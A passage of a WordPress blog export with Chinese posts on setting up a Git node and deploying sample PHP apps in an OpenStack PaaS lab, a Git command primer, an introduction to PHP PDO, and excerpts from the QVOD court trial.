		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[333]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>先电OpenStack v1.2 – PaaS平台Git节点搭建配置（脚本版）</title>
		<link>https://www.nervgeek.com/2015/12/30/%e5%85%88%e7%94%b5openstack-v1-2-paas%e5%b9%b3%e5%8f%b0git%e8%8a%82%e7%82%b9%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae%ef%bc%88%e8%84%9a%e6%9c%ac%e7%89%88%ef%bc%89/</link>
		<pubDate>Wed, 30 Dec 2015 13:13:10 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=473</guid>
		<description></description>
		<content:encoded><![CDATA[<h2 style="text-align: center;"><strong>Git </strong><strong>安装</strong></h2>

<strong>前提：</strong><strong>修改eth0的ip；在hosts文件上添加broker节点的ip和域名。</strong>
<strong> </strong>
<strong>配置yum源</strong>

<table width="871">
<tbody>
<tr>
<td width="436">[openshift-base]
name=openshift-base
baseurl=ftp://10.1.1.100/paas/openshift-base
enabled=1
gpgcheck=0</td>
<td width="436">[openshift-epel]
name=openshift-epel
baseurl=ftp://10.1.1.100/paas/openshift-epel
enabled=1
gpgcheck=0</td>
</tr>
<tr>
<td width="436">[openshift-origin]
name=openshift-origin
baseurl=ftp://10.1.1.100/paas/openshift-origin
enabled=1
gpgcheck=0</td>
<td width="436">[openshift-origin-dependencies]
name=openshift-origin-dependencies
baseurl=ftp://10.1.1.100/paas/openshift-origin-dependencies
enabled=1
gpgcheck=0</td>
</tr>
</tbody>
</table>

<strong> </strong><!--more-->
<strong> </strong>
<strong> 一、</strong><strong>安装git服务</strong>

<pre>yum install git</pre>

&nbsp;
<strong> 二、</strong><strong>安装RHC</strong>
从控制节点拷贝rhc文件夹到git服务器上，安装gem

<pre>yum install rubygems -y</pre>

逐步安装所需软件和rhc-1.32.2.gem

<pre>gem install –local /tmp/rhc/rhc-1.32.2.gem</pre>

配置

<pre>rhc setup –server=broker.example.com</pre>

&nbsp;
&nbsp;
<strong>三、安装Apache2</strong>

<pre>yum install httpd</pre>

<pre>chkconfig httpd on</pre>

&nbsp;
&nbsp;
<strong>四、配置公钥</strong>
在Node节点：

<pre>ssh-keygen</pre>

<pre>scp id_rsa.pub root@Git节点ip:/root/.ssh/authorized_keys</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>473</wp:post_id>
		<wp:post_date><![CDATA[2015-12-30 21:13:10]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-12-30 13:13:10]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%85%88%e7%94%b5openstack-v1-2-paas%e5%b9%b3%e5%8f%b0git%e8%8a%82%e7%82%b9%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae%ef%bc%88%e8%84%9a%e6%9c%ac%e7%89%88%ef%bc%89]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="openstack"><![CDATA[OpenStack]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="post_tag" nicename="%e5%8e%9f%e5%88%9b"><![CDATA[原创]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[1142]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>先电OpenStack v1.2 – PaaS平台各应用平台搭建配置</title>
		<link>https://www.nervgeek.com/2015/12/30/%e5%85%88%e7%94%b5openstack-v1-2-paas%e5%b9%b3%e5%8f%b0%e5%90%84%e5%ba%94%e7%94%a8%e5%b9%b3%e5%8f%b0%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae/</link>
		<pubDate>Wed, 30 Dec 2015 13:24:14 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=475</guid>
		<description></description>
		<content:encoded><![CDATA[<h2 style="text-align: center;">应用平台安装配置</h2>

<strong>前提：把Node的公钥添加至PaaS平台；在Node节点root下新建mygit和sourcegit两个文件夹，并从控制节点将paas-xiandian下的压缩包拷贝至mygit，解压。（需要安装unzip）；</strong>
<strong>在Git节点root下新建gitlocal文件夹，拷贝cakephp-example、wordpress-example两个压缩包，解压。</strong>
<strong> </strong>
<strong>一、</strong><strong>JenKins</strong>
直接从PaaS平台新建。
<a href="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212747.jpg" rel="attachment wp-att-529"><img class="alignnone size-full wp-image-529" src="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212747.jpg" alt="QQ20151212212747" width="2560" height="1399" /></a>
<strong> </strong><!--more-->
<strong>二、cakePHP</strong>
将Git节点的gitlocal下的<span style="color: #ff0000;">cakaphp-example</span>解压。并执行：

<pre>git clone --bare cakephp-example cakephp-example.git</pre>

在PaaS平台新建cakephp应用，填写：

<pre>root@git主机ip:/root/gitlocal/cakephp-example.git</pre>

创建应用。
<a href="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212750.jpg" rel="attachment wp-att-530"><img class="alignnone size-full wp-image-530" src="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212750.jpg" alt="QQ20151212212750" width="2560" height="1399" /></a>

<strong>三、WordPress</strong>
将Git节点的gitlocal下的<span style="color: #ff0000;">wordpress-example</span>解压。并执行：

<pre>git clone --bare wordpress-example wordpress-example.git</pre>

拷贝<span style="color: #ff0000;">wordpress-3.9.1.tar.gz</span>和<span style="color: #ff0000;">wordpress-3.9.1.tar.gz.md5</span>进Git下的<span style="color: #ff0000;">/var/www/html</span>下
在home下把<span style="color: #ff0000;">wordpress-example.git</span>克隆下来，进入：

<pre>wordpress-example/.openshift/</pre>

下修改<span style="color: #ff0000;">bulid</span>文件，将两处<span style="color: #ff0000;">wordpress.org</span>修改成Git节点的ip。
然后执行：

<pre>git commit –a</pre>

随便输入点东西，例如：yu
再执行：

<pre>git push</pre>

提交修改
在PaaS平台新建WordPress应用，填写：

<pre>root@git主机ip:/root/gitlocal/wordpress-example.git</pre>

创建应用。
<strong> <a href="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212753.jpg" rel="attachment wp-att-531"><img class="alignnone size-full wp-image-531" src="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212753.jpg" alt="QQ20151212212753" width="2560" height="1399" /></a></strong>

<strong>四、Sugarcrm</strong>
在PaaS平台下新建一个PHP5.3应用，添加MySQL、phpMyadmin组件，名为sugarcrm。
将<span style="color: #ff0000;">mygit</span>下的<span style="color: #ff0000;">sugarcrm-example-master.zip</span>解压。
然后复制应用的ssh密钥，在<span style="color: #ff0000;">sourcegit</span>下执行：

<pre>git clone ssh密钥</pre>

进入<span style="color: #ff0000;">sourcegit的sugarcrm文件夹里</span>，将<span style="color: #ff0000;">mygit</span>解压出来的<span style="color: #ff0000;">sugarcrm-example-master</span>覆盖到<span style="color: #ff0000;">sourcegit</span>下的<span style="color: #ff0000;">sugarcrm</span>。

<pre>cd /root/sourcegit/sugarcrm</pre>

<pre>cp –Rvf /root/mygit/sugarcrm-example-master/* .(小数点代表当前目录</pre>

继续在<span style="color: #ff0000;">/root/sourcegit/sugarcrm</span>目录下执行：

<pre>git add .</pre>

<pre>git commit –am “sugarcrm”</pre>

<pre>git push</pre>

回到PaaS平台，点击刚新建的<span style="color: #ff0000;">sugarcrm</span>的应用，点击该应用链接，发现应用已成功部署。
<a href="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212733.jpg" rel="attachment wp-att-533"><img class="alignnone size-full wp-image-533" src="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212733.jpg" alt="QQ20151212212733" width="2560" height="1399" /></a>

<strong>五、Drupal</strong>
在PaaS平台下新建一个PHP5.3应用，添加MySQL、phpMyadmin组件，名为drupal。
将<span style="color: #ff0000;">mygit</span>下的<span style="color: #ff0000;">drupal-7.34.tar.gz</span>解压。
然后复制应用的ssh密钥，在<span style="color: #ff0000;">sourcegit</span>下执行：

<pre>git clone ssh密钥</pre>

进入<span style="color: #ff0000;">sourcegit/drupal下的php文件夹里</span>，将<span style="color: #ff0000;">mygit</span>解压出来的<span style="color: #ff0000;">drupal-7.34</span>覆盖到<span style="color: #ff0000;">sourcegit/drupal下的php</span>。

<pre>cd /root/sourcegit/drupal/php</pre>

<pre>cp –Rvf /root/mygit/drupal-7.34/* .(小数点代表当前目录</pre>

继续在<span style="color: #ff0000;">/root/sourcegit/drupal/php</span>目录下执行：

<pre>git add .</pre>

<pre>git commit –am “drupal”</pre>

<pre>git push</pre>

回到PaaS平台，点击刚新建的<span style="color: #ff0000;">drupal</span>的应用，点击该应用链接，发现应用已成功部署。
<strong> <a href="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212740-1.jpg" rel="attachment wp-att-536"><img class="alignnone size-full wp-image-536" src="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212740-1.jpg" alt="QQ20151212212740" width="2560" height="1399" /></a></strong>

<strong> 六、</strong><strong>Dolibarr</strong>
在PaaS平台下新建一个PHP5.3应用，添加MySQL、phpMyadmin组件，名为Dolibarr。
将<span style="color: #ff0000;">mygit</span>下的<span style="color: #ff0000;">dolibarr-3.6.2.zip</span>解压。
然后复制应用的ssh密钥，在<span style="color: #ff0000;">sourcegit</span>下执行：

<pre>git clone ssh密钥</pre>

进入<span style="color: #ff0000;">sourcegit/dolibarr/php</span>，修改<span style="color: #ff0000;">index.php</span>文件，代码如下：

&lt;?php
header(“Location:dolibarr/htdocs”);
?&gt;

进入<span style="color: #ff0000;">sourcegit/dolibarr下的php文件夹里</span>新建一个文件夹名为<span style="color: #ff0000;">dolibarr</span>，将<span style="color: #ff0000;">mygit</span>解压出来的<span style="color: #ff0000;">dolibarr-3.6.2</span>覆盖到<span style="color: #ff0000;">sourcegit/ dolibarr/php</span>下的<span style="color: #ff0000;">dolibarr</span>。

<pre>cd /root/sourcegit/dolibarr/php/dolibarr/</pre>

<pre>cp –Rvf /root/mygit/dolibarr-3.6.2/* .(小数点代表当前目录</pre>

继续在<span style="color: #ff0000;">/root/sourcegit/dolibarr/php/dolibarr</span>目录下执行：

<pre>git add .</pre>

<pre>git commit –am “dolibarr”</pre>

<pre>git push</pre>

回到PaaS平台，点击刚新建的<span style="color: #ff0000;">dolibarr</span>的应用，点击该应用链接，发现应用已成功部署。
<a href="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212743.jpg" rel="attachment wp-att-537"><img class="alignnone size-full wp-image-537" src="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212743.jpg" alt="QQ20151212212743" width="2560" height="1399" /></a>

<strong>七、</strong><strong>Magento</strong>
在PaaS平台下新建一个PHP5.3应用，添加MySQL、phpMyadmin组件，名为Magento。
将<span style="color: #ff0000;">mygit</span>下的<span style="color: #ff0000;">magento-example-master.zip</span>解压。
然后复制应用的ssh密钥，在<span style="color: #ff0000;">sourcegit</span>下执行：

<pre>git clone ssh密钥</pre>

进入<span style="color: #ff0000;">sourcegit</span>下的<span style="color: #ff0000;">magento</span>文件夹里，将<span style="color: #ff0000;">mygit</span>解压出来的<span style="color: #ff0000;">magento-example-master</span>覆盖到<span style="color: #ff0000;">sourcegit</span>下的<span style="color: #ff0000;">magento</span>。

<pre>cd /root/sourcegit/magento</pre>

<pre>cp –Rvf /root/mygit/magento-example-master/* .(小数点代表当前目录</pre>

继续在<span style="color: #ff0000;">/root/sourcegit/magento</span>目录下执行：

<pre>git add .</pre>

<pre>git commit –am “magento”</pre>

<pre>git push</pre>

回到PaaS平台，点击刚新建的<span style="color: #ff0000;">magento</span>的应用，点击该应用链接，发现应用已成功部署。
<strong> <a href="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212737.jpg" rel="attachment wp-att-538"><img class="alignnone size-full wp-image-538" src="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212737.jpg" alt="QQ20151212212737" width="2560" height="1399" /></a></strong>

<strong>八、</strong><strong>Moodel</strong>
<strong>基本步骤同上，覆盖路径在<span style="color: #ff0000;">/model/php</span>下。</strong>
<strong><a href="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212727.jpg" rel="attachment wp-att-539"><img class="alignnone size-full wp-image-539" src="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212727.jpg" alt="QQ20151212212727" width="2560" height="1399" /></a> </strong>

<strong>九、</strong><strong>OpenAtrium</strong>
<strong>基本步骤同上，需多添加<span style="color: #ff0000;">cron1.4</span>组件。</strong>

最后一张大合照
<a href="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212804.jpg" rel="attachment wp-att-540"><img class="alignnone size-full wp-image-540" src="https://www.nervgeek.com/wp-content/uploads/2015/12/QQ20151212212804.jpg" alt="QQ20151212212804" width="2560" height="1399" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>475</wp:post_id>
		<wp:post_date><![CDATA[2015-12-30 21:24:14]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-12-30 13:24:14]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%85%88%e7%94%b5openstack-v1-2-paas%e5%b9%b3%e5%8f%b0%e5%90%84%e5%ba%94%e7%94%a8%e5%b9%b3%e5%8f%b0%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="openstack"><![CDATA[OpenStack]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="post_tag" nicename="%e5%8e%9f%e5%88%9b"><![CDATA[原创]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[412]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Git命令以及使用办法</title>
		<link>https://www.nervgeek.com/2016/01/01/git%e5%91%bd%e4%bb%a4%e4%bb%a5%e5%8f%8a%e4%bd%bf%e7%94%a8%e5%8a%9e%e6%b3%95/</link>
		<pubDate>Fri, 01 Jan 2016 09:53:48 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=499</guid>
		<description></description>
		<content:encoded><![CDATA[<h4><strong>Git 常用命令</strong></h4>

创建本地仓库(repository)，将会在文件夹下创建一个 .git 文件夹，.git 文件夹里存储了所有的版本信息、标记等内容

<pre>git init here</pre>

&nbsp;
把本地仓库和远程仓库关联起来。如果不执行这个命令的话，每次 push 的时候都需要指定远程服务器的地址

<pre>git remote add origin git@github.com:winter1991/helloworld.git</pre>

&nbsp;
从本地仓库增删，结果将会保存到本机的缓存里面

<pre>git add
 git rm</pre>

&nbsp;
<!--more-->提交，把本机缓存中的内容提交到本机的 HEAD 里面

<pre>git commit -m "注释"</pre>

&nbsp;
把本地的 commit(提交) push 到远程服务器上， origin 也就是之前 git remote add origin 那个命令里面的 origin，origin 替代了服务器

<pre>git push origin master</pre>

仓库地址：git push git@github.com:winter1991/helloworld.git master
&nbsp;
从远程服务器 pull 新的改动

<pre>git pull origin master</pre>

&nbsp;
查看状态

<pre>git status</pre>

&nbsp;
提交全部修改

<pre>git add -A</pre>

<h4></h4>

&nbsp;

<h5>一、git 配置：</h5>

配置用户名，上传本地 repository 到服务器上的时候，在 Github 上会显示这里配置的上传者信息

<pre>git config --global user.name "xxx"</pre>

配置邮箱

<pre>git config --global user.email "xxx"</pre>

&nbsp;
查看配置列表

<pre>git config --list</pre>

&nbsp;
<strong>配置 sshkey ： 上传代码时使用这个 sshkey 来确认是否有上传权限</strong>
<strong>1.</strong> 创建本地 ssh ： ssh-keygen -t rsa -C "Github 的注册邮箱"
<strong>2.</strong> 在 Github 中添加这个 sshkey ：
复制 C:\Documents and Settings\Administrator&#46;ssh\id_rsa.pub 文件中的内容；
登录 Github --&gt; Account Setting --&gt; SSH-KEY --&gt; Add SSH-KEY --&gt; 粘贴id_rsa.pub中的内容；
<strong>3.</strong> 验证： ssh -T git@github.com
出现 Hi xxx! You've successfully authenticated, but GitHub does not provide shell access. 说明配置成功，可以连接上 Github

<h5></h5>

&nbsp;

<h5>二、建立仓库 repository ：</h5>

git init here -- 创建本地仓库
git remote add origin git@github.com:用户名/仓库名.git
-- 把本地仓库和远程仓库关联起来， 如果不执行这个命令的话，每次 push 的时候都需要指定远程服务器的地址

<h5></h5>

&nbsp;

<h5>三、从远程仓库中下载新的改动：</h5>

<pre>git pull origin master</pre>

&nbsp;
&nbsp;

<h5>四、提交本地修改到远程仓库中：</h5>

git add
git add -A -- 将改动添加到本地仓库中
git rm xxx -- 从本地仓库中删除指定文件
git rm -r xxx -- 从本地仓库中删除指定文件夹
git commit -m "注释" -- 把本机缓存中的内容提交到本机的 HEAD 里面
git push origin master -- 把本地的 commit push 到远程仓库中

<h5></h5>

&nbsp;

<h5>五、使用 .gitignore 文件忽略指定的内容：</h5>

<strong>1.</strong> 在本地仓库根目录创建 .gitignore 文件。Win7 下不能直接创建，可以创建 ".gitignore." 文件，后面的标点自动被忽略；
<strong>2.</strong> 过滤文件和文件夹： [Tt]emp/ 过滤 Temp\temp 文件夹； <em>.suo 过滤 .suo 文件；
<strong>3.</strong> 不过滤文件和文件夹： !</em>.c]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>499</wp:post_id>
		<wp:post_date><![CDATA[2016-01-01 17:53:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-01 09:53:48]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[git%e5%91%bd%e4%bb%a4%e4%bb%a5%e5%8f%8a%e4%bd%bf%e7%94%a8%e5%8a%9e%e6%b3%95]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="git"><![CDATA[Git]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e8%bd%af%e4%bb%b6%e5%ba%94%e7%94%a8"><![CDATA[软件应用]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[226]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>PHP教程之PDO链接MySQL数据库 0x01</title>
		<link>https://www.nervgeek.com/2016/01/05/php%e4%b8%admysql%e6%95%b0%e6%8d%ae%e5%ba%93pdo%e6%95%99%e7%a8%8b/</link>
		<pubDate>Tue, 05 Jan 2016 13:41:28 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=508</guid>
		<description></description>
		<content:encoded><![CDATA[<h4>1、为什么要使用PDO？</h4>

mysql_<em>函数已经过时，相当一段时间以来，mysql_</em>函数在其他SQL数据库编程接口方面已经有所差别；它不支持预处理，存储过程，事务等一些现代数据库设计思想，SQL语句字符串转义函数 <code>mysql_real_escape_string()</code> 和 拼接SQL语句的编程方法 已经过时并且很容易出错。最近一段时间里，它缺乏开发者的关注，缺少维护将可能导致一些安全问题不能被即时修复，或者在适配新版本的MySQL的时候不能正常工作，这成为mysql_<em>函数面临的的另一个问题。PHP社区最近也对mysql_</em>函数给出不建议使用的建议，也有可能在未来的版本中最终被弃用（不过不用过于担心，这可能还需要很长一段时间）。
PDO拥有更好的编程接口，你可以使用它写出更加简洁，高效，安全的代码。PDO还为不同的SQL数据库提供了不同的驱动，方便你使用新的数据库而不用再学习不同的编程接口。与拼接SQL语句构造查询语句不同，绑定参数可以简洁方便的构造出更加安全的查询语句，使用绑定参数的方法在 多次相似语句查询（仅仅某个参数不同）中也可以提高不少性能。PDO在错误处理方面也提供了多种方法。mysql_*函数缺乏一致的处理，与PDO的异常模式相比，或者说没有处理异常，使用PDO，你可以得到一致的错误处理，这将节省您大量的时间来跟踪问题。
在当前的PHP版本中，PDO模块是默认安装启用的，但是在使用PDO前你还需要安装另外两个软件包，一个是pdo_mysql数据库驱动程序，另外一个是类似php-mysql的mysql驱动程序。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>508</wp:post_id>
		<wp:post_date><![CDATA[2016-01-05 21:41:28]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-05 13:41:28]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php%e4%b8%admysql%e6%95%b0%e6%8d%ae%e5%ba%93pdo%e6%95%99%e7%a8%8b]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="mysql"><![CDATA[MySQL]]></category>
		<category domain="post_tag" nicename="pdo"><![CDATA[PDO]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[php]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[186]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>快播案庭审笑点（一）</title>
		<link>https://www.nervgeek.com/2016/01/08/%e5%bf%ab%e6%92%ad%e6%a1%88%e5%ba%ad%e5%ae%a1%e7%ac%91%e7%82%b9%ef%bc%88%e4%b8%80-1-%e5%85%ac%e8%af%89%e4%ba%ba%ef%bc%9a%e8%b5%b7%e8%af%89%e4%b9%a6%e4%b8%8a%e6%89%80%e8%bf%b0%e7%9a%84%e5%bf%ab/</link>
		<pubDate>Fri, 08 Jan 2016 12:51:39 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=510</guid>
		<description></description>
		<content:encoded><![CDATA[<div id="w-012" class="diy-widget">
<div id="w-012-i" class="diy-inner">
<div id="w-012-c" class="diy-content diy-content-html">
<div>
 1.
公诉人：起诉书上所述的快播软件被用户用作点播淫秽视频，你知道吗？
王欣（快播首席执行官）：互联网上是存在不良信息的，上亿的用户里肯定会有个别用户点播淫秽色情信息。快播无法辨别用户是在线播放还是本地播放。
2.
公诉人：你们说自己对避免用户点击淫秽视频做了很多措施，但是，在你们的缓存服务器中查到了大量淫秽视频，对此，你怎么解释？
王欣：我也觉得很奇怪为什么会有这么多淫秽色情文件。快播几亿的文件，淫秽视频只是其中很小部分，存在举报盲点。
3.
辩护人：既然你们无法有效监管不良信息，为何不人工逐一观看？ 王欣：如果采用人工防范方式来逐一观看处理不良画面，公司就开不下去了。业内都不会做这样的工作。
<!--more-->
4.
辩护人：快播公司在信息安全监管方面有无受到过政府部门的奖励和表扬？
王欣：我们升级屏蔽不良关键字的举措起到了很好的效果，受到了深圳网监的表扬。
5.
公诉人：明知管不了淫秽视频，为什么公司不转型？
王欣：我们公司不具备做内容的基因；其次，我们认为技术并不可耻，坚持做技术的人很难得，为什么要去转型？
6.
公诉人：淫秽视频发布者为什么选择快播的系统来发布？
王欣：因为我们的播放效果非常好，很多年打不开的视频都可以打开。
7.
吴铭（快播事业部总经理）：北京市公安局从上述服务器中的三台服务器里提取了29841个视频文件进行鉴定，认定其中属于淫秽视频的文件为21251个。这个数据太可笑了，很可能是做的。这怎么可能呢？难道一天到晚没事做光看这个？
8.
审判长：我觉得你们这个110系统功能也不是很复杂啊，技术难度很简单嘛。屏蔽的网址很好改吧？一天可以改100个？
王欣：用户过亿之后，涉及到一个效率问题，后台可能撑不到。
审判长：不用多说了，明白了。
9.
审判长问张克东：你是搞技术的是吧？从你了解来讲，画面拦截能不能达到？
张克东（快播事业部副总经理兼技术平台部总监）：没有这种技术手段。
</div>
</div>
</div>
</div>

<div id="w-6861" class="diy-widget">
<div id="w-6861-i" class="diy-inner">
<div id="w-6861-c" class="diy-content diy-content-html">
<div>
10.
辩护人：每个视频打开就是淫秽画面吗？
鉴定人：鼠标一拖进度条，就能出来影片的某一个情节，一般如果是淫秽视频就能确定了。
辩护人：第二份鉴定结果，说提取25000多文件，鉴定出淫秽视频17000多，你是把四台服务器的视频都看了吗？
鉴定人：领导拿过来多少硬盘，我就看多少。
辩护人：2万多您是都看过吧？
鉴定人：对！
辩护人：十一休息了吗？
鉴定人：没休息，得抓紧时间完成领导任务，每天至少看600部，多的看800部。
辩护人：90多天能看多少部？
鉴定人：这没算过，600部是我的底限，每天反正给自己定个标准。 辩护人：你用的什么播放器看的视频？
鉴定人：完美解码播放器。
辩护人：也就说这个完美解码也是个播放器，这个播放器也能看淫秽视频，也能看非淫秽视频？
鉴定人：是的。
审判长：判断淫秽视频的标准？
鉴定人：针对快播这个，只要有性交行为，就判定为淫秽视频。
</div>
</div>
</div>
</div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>510</wp:post_id>
		<wp:post_date><![CDATA[2016-01-08 20:51:39]]></wp:post_date>
